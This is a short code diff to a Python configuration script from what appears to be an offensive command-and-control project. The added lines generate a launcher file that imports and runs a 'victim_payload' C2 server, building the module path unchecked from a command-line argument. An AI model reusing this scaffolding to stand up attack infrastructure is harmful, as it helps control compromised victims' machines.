@@ -77,5 +77,14 @@ def config():
             LogPrompt("Conf file generated");
         except IOError:
             LogPrompt("Conf file could not be generated");
+    try:
+        with open("./RunC2.PY","w+") as f:
+            f.write("from payload."+sys.argv[1]+""".server.CommandAndControle import victim_payload
+
+CnC = victim_payload()
+CnC.payload();""")
+    except IOError:
+        LogPrompt("Error in writing RunC2.py file to run the command and control server.")
+
 # os.chdir('../');
 config();
